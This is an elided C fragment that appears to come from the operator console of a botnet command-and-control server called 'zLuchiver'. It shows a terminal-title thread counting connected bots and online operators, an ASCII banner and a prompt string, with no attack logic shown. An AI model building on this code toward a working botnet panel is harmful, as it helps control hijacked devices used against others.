...
void *TitleWriter(void *sock) {
    ...
    while(1) {
        ...
        sprintf(string, "%c]0;zLuchiver | Devices Connected: %d | Users Online: %d | User: %s %c", '\033', BotsConnected(), OperatorsConnected, accounts[find_line].username, '\007');
		...
		sprintf(Sakura_banner2, "╦  ╦ ╦╔═╗╦ ╦╦╦  ╦╔═╗╦═╗\e[0m\r\n");
		sprintf(Sakura_banner3, "║  ║ ║║  ╠═╣║╚╗╔╝║╣ ╠╦╝\e[0m Type \e[1;95mHELP\e[0m For Help.\e[0m\r\n");
		sprintf(Sakura_banner4, "╩═╝╚═╝╚═╝╩ ╩╩ ╚╝ ╚═╝╩╚═\e[0m\r\n");
		...
		while(1) {
		char input [5000];
        sprintf(input, "\e[0m[\e[1;95mzLuchiver\e[0m]~: \e[0m");
